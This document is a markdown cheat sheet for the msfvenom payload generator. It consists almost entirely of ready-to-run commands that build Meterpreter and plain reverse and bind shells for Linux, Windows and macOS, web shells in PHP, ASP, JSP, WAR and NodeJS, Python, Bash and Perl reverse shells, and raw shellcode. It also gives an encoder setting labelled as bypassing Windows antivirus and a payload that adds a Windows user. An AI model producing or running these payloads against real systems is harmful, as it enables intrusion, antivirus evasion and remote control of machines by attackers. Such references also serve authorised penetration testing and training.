# MSFVenom

## List payloads
```bash
msfvenom -l
msfvenom -l encoders # lists encoders
```
## Useful parameters
```bash
-b "\x00\x0a\x0d" 
-f c 
-e x86/shikata_ga_nai -i 3 # Bypass Windows AV
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## Binary Payloads
### Linux Meterpreter Reverse Shell
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > FILENAME.elf
```
### Linux Bind Meterpreter Shell
```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > FILENAME.elf
```
### Linux Bind Shell
```
msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > FILENAME.elf
```
### Windows Meterpreter Reverse TCP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > FILENAME.exe
```
### Windows Reverse TCP Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > FILENAME.exe
```
### Windows Encoded Meterpreter Windows Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > FILENAME.exe
```
### Mac Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > FILENAME.macho
```
### Mac Bind Shell
```
msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f macho > FILENAME.macho
```
## Web payloads
### PHP Meterpreter Reverse TCP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
```
### JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```
### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
```
### NodeJS
```
msfvenom -p nodejs/shell_reverse_tcp LHOST<IP Address> LPORT=<Your Port> -f js > shell.js
```

## Scripting payloads
### Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
```
### Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
### Perl Unix Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
```
## Shellcode
### Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```
### Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```
### Mac Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```
## Create user
```
msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f exe > adduser.exe
```